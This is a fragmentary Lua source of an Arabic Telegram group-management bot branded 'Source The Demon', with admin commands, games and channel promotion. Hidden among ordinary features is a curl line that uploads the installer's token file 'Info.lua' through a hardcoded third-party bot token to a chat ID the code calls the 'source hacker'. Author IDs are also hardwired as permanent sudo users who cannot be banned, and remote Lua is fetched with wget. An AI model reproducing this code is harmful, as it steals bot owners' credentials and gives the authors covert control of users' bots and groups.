...
io.write('\27[0;31m\n ارسل لي توكن البوت الان 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 :\na𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 :\na𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n\27[0;33;49m')
...
io.write('\27[1;31m 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍"
echo "TG IS NOT FIND IN FILES BOT"
echo "𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍"
exit 1
fi
if [ ! $token ]; then
echo "𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍"
...
print([[
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |   ______     | || |      __      | || |  _______     | || |   _____      | || |     ____     | |
| |  |_   _ \    | || |     /  \     | || | |_   __ \    | || |  |_   _|     | || |   .'    `.   | |
| |    | |_) |   | || |    / /\ \    | || |   | |__) |   | || |    | |       | || |  /  .--.  \  | |
| |    |  __'.   | || |   / ____ \   | || |   |  __ /    | || |    | |   _   | || |  | |    | |  | |
| |   _| |__) |  | || | _/ /    \ \_ | || |  _| |  \ \_  | || |   _| |__/ |  | || |  \  `--'  /  | |
| |  |_______/   | || ||____|  |____|| || | |____| |___| | || |  |________|  | || |   `.____.'   | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   
...
token = sudos.token 
--- start functions 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,1719061213,1001132193,1208165035}   
...
if tonumber(user_id) == tonumber(1001132193) then  
var = 'هكر السورس'
elseif tonumber(user_id) == tonumber(1719061213) then
var = 'مبرمج السورس'
...
local UserName = (data.username_ or "bar_lo0o0o0o0o")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1715000615:AAGRaBc-KdEfPikYWTQpvAjj9LWoM7Dwz_E/sendDocument'..'" -F "chat_id='.. 1001132193 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
{'━┅┅┄⟞⟦《مبرمج ☆ السورس》⟧⟝┄┉┉━'},
{ 'الشيطان'},
{'𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍'},
{'ثيم','بايو','ايدي'},
{'𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍'},
{'ضع اسم للبوت','التواصل'},
{'𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍'},
{'تويت','صراحه'},
{'𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍'},
{'انصحنى','كتابات'},
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'الشيطان') 
local DRAGON_Msg = { 
...
if text == 'قسم هكر السورس والمبرمج' then
local Text = ' قسم هكر السورس لدخول الي حسابه'
local Key = {
{'━┅┅┄⟞⟦ مبرمج السورس ⟧⟝┄┉┉━'},
...
local Text = ' ✠تم ارسال الملصق من 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/barlo0/sht/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/bar_lo0o0o0o0o/1469&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'قسم هكر السورس' and DevSoFi(msg) then 
local Text = ' قسم هكر السورس للذهاب إلي حسابه '
local Key = {
{'━┅┅┄⟞⟦ هكر السورس ⟧⟝┄┉┉━'},
{'يا سورس','التواصل'},
{'العوده🌟'},
...
local Text = 'أهلا بك عزيزي المطور الأساسي داخل قسم اضافه وحذف الردود العامه'
local Key = {
...
send(msg.chat_id_, msg.id_,' ✠ اصدار سورس الشيطان{ 3x✴}')
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'هكر السورس☎️', url="t.me/bar_lo0o0o0o0o"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Bar_lo0o0o0o0o/2107' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس Barlo0o ادخل وتابع الجديد](t.me/bar_lo0o0o0o0o)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》', url="t.me/bar_lo0o0o0o0o"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == '━┅┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉┉━' and DevSoFi(msg) then
local Text = [[ 
[قناه سور
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '✧🧑‍ مبرمج العظمة يرحقلبي 💻✧',url="t.me/Al_shaitaan"}},
{{text = '✈ • اضف البوت الي مجموعتك • ✈' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 

}  
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/c/1393263187/2' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'بوت التواصل' or text == 'التواصل' then  
local Text = [[  
اليك بوت التواصل
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'تواصل السورس',url="t.me/imfiinee1"}},
{{text = '✈ • اضف البوت الي مجموعتك • ✈' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
...
if text == 'hack' or text == 'الهكر' then  
local Text = [[  
🌝💞《 صانع العظمة يحوبي 》💞🌝
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '🌝💞《 صانع العظمة يحوبي 》💞🌝',url="t.me/bar_lo0o0"}},
{{text = '✈ • اضف البوت الي مجموعتك • ✈' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 

}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/swr_arlo/5' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
{{text = '🎯رواية "أرض زيكولا"',url="https://t.me/bar_lo0o0o0o0o"}},
{{text = '🎯موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/bar_lo0o0"}},
{{text = '🎯رواية "الشفق الجزء الأول"', url="https://t.me/bar_lo0o0"}},
{{text = '🎯رواية "المخلوق', url="https://t.me/bar_lo0o0o0o0o"}},
{{text = '🎯رواية "بعد النسيان"', url="https://t.me/bar_lo0o0"}},
{{text = '🎯كتاب في حضرة الجن', url="https://t.me/https://t.me/bar_lo0o0o0o0o"}},
{{text = '🎯رواية "واختفى كل شئ"', url="https://t.me/bar_lo0o0"}},
{{text = '🎯رواية "نيلوفر أسود"', url="https://t.me/bar_lo0o0o0o0o"}},
{{text = '🎯رواية"جثة في الفندق"', url="https://t.me/bar_lo0o0"}},
{{text = '🎯رواية "في القطار السريع"', url="https://t.me/bar_lo0o0o0o0o"}},
{{text = '🎯لقاء مع كاتب رعب"', url="https://t.me/bar_lo0o0"}},
{{text = '🎯رواية"الإنسان الأخير""', url="https://t.me/bar_lo0o0o0o0o"}},
{{text = '🎯رواية" مقبرة الحيوانات""', url="https://t.me/bar_lo0o0"}},
{{text = '𝑩𝑨𝑹𝑳𝑶',url="t.me/barlo0o_bot"}},
{{text = '✈ • اضف البوت الي مجموعتك • ✈' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
...
local Text = [[
هكر سورس الشيطان اتبع الازرار للتواصل معه ⬇️🧿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الشيطان مطور السورس',url="t.me/bar_lo0o0"}},
}
local msg_id = msg.id_/2097152/0.5
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس الشيطان؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس الشيطان؟ ", 
"كم مره حبيت؟ ", 
...
if text == '《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ' then
local Text = [[ 
 ✠من أحسن السورسات على التليجرام سورس الشيطان ✠
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ](http://t.me/bar_lo0o0o0o0o)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ', url="t.me/bar_lo0o0o0o0o"}}, 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/bar_lo0o0o0o0o/2017=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍' then
local Text = [[ 
⚡من اقوي السورسات علي التليجرام سورس الشيطان أمان جدا لو حابب تتواصل معايا لتنصيب بوت مجاني اضغط علي التواصل⚡
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》', url="t.me/bar_lo0o0o0o0o"}}, 
...
if text == 'العاب الشيطان' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ✠ اهلا في قائمه الالعاب المتطوره سورس الشيطان ✠ 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/bar_lo0o0o0o0o)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local bar_lo0o0o0o0o = database:get(bot_id..'text:ch:user')
if bar_lo0o0o0o0o then
send(msg.chat_id_, msg.id_,'['..bar_lo0o0o0o0o..']')
else
...
send(msg.chat_id_, msg.id_, " عايز تحظر مين يا أهطل ؟ 😑")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1719061213) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ✴")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1001132193) then  
send(msg.chat_id_, msg.id_, "عذرآ لـآ يمكن حظر المبرمج الشيطان عام 🚫")
return false 
end
...
function(arg,data) 
usertext = '\n ✴ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'bar_lo0o0o0o0o')..')'
...
if result.id_ == tonumber(1719061213) then
...
usertext = '\n ✴ العضو ← ['..result.title_..'](t.me/'..(username or 'bar_lo0o0o0o0o')..')'
status  = '\n ✴ تم حظره عام من {'..Groups..'} مجموعه'
texts = usertext..status
...
if tonumber(userid) == tonumber(1719061213) then  
send(msg.chat_id_, msg.id_, "لا يمكنك حظر مبرمج السورس عام ✴")
return false 
end
if tonumber(userid) == tonumber(1001132193) then  
...
if tonumber(result.sender_user_id_) == tonumber(1001132193) then  
send(msg.chat_id_, msg.id_, " 🌝 بتكتم مين يبني يعني هل انت عبيط")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1719061213) then  
...
if tonumber(userid) == tonumber(1001132193) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم الشيطان عام لانه هكر 🌚😹")
return false 
end
...
t = ' ✠ ملفات السورس الشيطان𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/husein23/BR/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✠ اهلا بك في متجر ملفات الشيطان\n ✠ ملفات السورس 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n ✠ علامة تعني { ✔️ } ملف مفعل\n ✠ علامة تعني { ✖ } ملف معطل\n ✠ قناة سورس الشيطان𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n".." ✠ [اضغط هنا لدخول](t.me/bar_lo0o0o0o0o) \n"
local NumFile = 0
...
send(msg.chat_id_, msg.id_," ✠ عذرا الملف لايدعم سورس الشيطان\n") 
end
return false
end
...
if text == ("مسح قائمه الشيطان") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ✠ تم مسح قائمه الشيطان')
return false
end

if text == 'قائمه الشيطان' and Sudo(msg) then
...
if #list == 0 then
t = " ✠ لا يوجد احد في قائمه الشيطان"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع هكر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع هكر@(.*)$") and Sudo(msg) then
...
if text and text:match("^رفع هكر(%d+)$") and Sudo(msg) then
...
if text == ("تنزيل هكر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل هكر@(.*)$") and Sudo(msg) then
...
if text and text:match("^تنزيل هكر(%d+)$") and Sudo(msg) then
...
------------------------------------------------------------------------ adddev2 sudog
if text == ("رفع الشيطان") and tonumber(msg.reply_to_message_id_) ~= 0 and SudoBot(msg) then
...
if text and text:match("^رفع الشيطان @(.*)$") and SudoBot(msg) then
local username = text:match("^رفع الشيطان @(.*)$")
function Function_DRAGON(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"✠ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
if text and text:match("^رفع الشيطان (%d+)$") and SudoBot(msg) then
local userid = text:match("^رفع الشيطان (%d+)$")
...
t = "\n ✠ قائمه زوجات الجروب \n ✠═───═❲[《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ✠ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'bar_lo0o0o0o0o')..')'
...
' }\nء⧬━┅┅┄⟞❲[᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣](t.me/bar_lo0o0o0o0o)❳⟝┄┉┉━⧬'..
'\n ✠  علامة ال {✓} تعني مفعل'..
'\n ✠  علامة ال {✘} تعني معطل'..
'\nء𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍'..
'\n'..' ✠  امر صيح  ⇇{ '..kickme..
...
' }\n'..' ✠  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ✠  الرفع  ⇇{ '..setadd..
' }\n'..' ✠  الحظر  ⇇{ '..banm..' }\n\n ✠═───═❲[《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)❳═───═ ✠\n ✠ قناة سورس الشيطان𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\n [ ❲[《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)❳](t.me/bar_lo0o0o0o0o) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍\nاضغط علي الاسم ليتم نسخه\n𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍ٴ\n ✠ ❲[《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)❳ ✠ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'الشيطان').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'الشيطان')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس الشيطانو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
end --الكود حصري سورس الشيطانيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'الشيطان').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/bar_lo0o0o0o0o)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/bar_lo0o0o0o0o)')
return false
end
...
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n ✠ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ✠ تم رفعه خنزير في الروم الأن هو خنزير من الدرجه الأولي'
texts = usertext..status
else
texts = ' ✠ لا يوجد حساب بهاذا المعرف'
end
...
[[
🌨𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍Use ⇨ #username 🌨
🌨𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍iD ⇨ #id 🌨
🌨𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍Sta ⇨  #stast 🌨
🌨𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍Msg ⇨ #msgs ??
🌨𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍NaMe ⇨ #name  🌨
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
...
[[
↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username ✠  
↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍𝙄𝘿 ➱ #id
↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍𝙍𝘼𝙉𝙆 ➱  #stast ✠  
↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍𝙈𝘼𝙎𝙂 ➱ #msgs ✠  
↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍𝗖𝗛 ➯  ↝@bar_lo0o0o0o0o↜ ✠  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
?? 𝟔 𖡻 #msgs  ࿇🦄
...
send(msg.chat_id_,msg.id_,'\n ✠ اهلا عزيزي البوت هنا ادمن'..'\n ✠ وصلاحياته هي 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍 \n━━━━━━━━━━'..'\n ✠ تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n ✠ مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n ✠ حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n ✠ دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n ✠ تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n ✠ اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
end
end
end
...
[🎯ألعاب سورس الشيطان الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《♡ 𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ》 ](t.me/bar_lo0o0o0o0o)
]]
keyboard = {} 
...
local Text = [[
 ...
 تحت لي في الزر الأسفل𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍
 اختر الامر الذي تريدها .↑𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍
ده من الازرار بلاسفل . 𖤍━┅┄⟞⟦᪣𝑆𝑂𝑈𝑅𝐶𝐸 ͲᎻᎬ ᎠᎬᎷΌΝ᪣⟧⟝┄┉━𖤍
